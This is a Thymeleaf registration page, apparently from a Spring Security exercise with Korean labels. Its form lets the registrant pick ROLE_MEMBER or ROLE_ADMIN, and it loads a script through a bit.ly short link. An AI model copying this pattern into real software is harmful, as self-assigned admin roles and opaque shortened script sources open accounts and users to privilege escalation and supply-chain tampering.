<!DOCTYPE html>
<html lang="ko" xmlns:th="http://www.thymeleaf.org">
<head>

</head>
<body>
    <!-- register.html -->
    <th:block th:replace="~{inc/header.html :: header}"></th:block>
    
    <h2>Register</h2>
    
    <form method="POST" action="/registerok">
    <table class="vertical content">
        <tr>
            <th>아이디</th>
            <td><input type="text" name="username" class="short" required></td>
        </tr>
        <tr>
            <th>암호</th>
            <td><input type="password" name="password" class="short" required></td>
        </tr>
        <tr>
            <th>권한</th>
            <td>
                <select name="role">
                    <option value="ROLE_MEMBER">일반회원</option>
                    <option value="ROLE_ADMIN">관리자</option>
                </select>
            </td>
        </tr>
    </table>
    <div>
        <button>가입하기</button>
    </div>
    <input type="hidden" th:name="${_csrf.parameterName}" th:value="${_csrf.token}">
    </form>
    
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    <script src="https://bit.ly/4cMuheh"></script>

    </script>
</body>
</html>
